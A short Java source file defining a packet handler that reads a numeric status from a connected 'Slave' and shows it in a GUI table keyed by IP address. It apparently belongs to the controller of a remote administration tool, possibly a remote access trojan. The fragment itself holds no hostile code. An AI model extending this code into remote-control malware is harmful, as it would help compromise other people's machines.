package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.Status;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.utils.Util;

public class PacketSTAT extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String status = slave.readLine();
		int istatus = Integer.parseInt(status);
		
		try {
			Frame.mainModel.setValueAt(Status.getStatusFromID(istatus), Util.getRow(3, slave.getIP()), 2);
			slave.setStatus(istatus);
		} catch (Exception ex) {
			ex.printStackTrace();
			Frame.mainModel.setValueAt(status, Util.getRow(3, slave.getIP()), 2);
		}				
	}

}
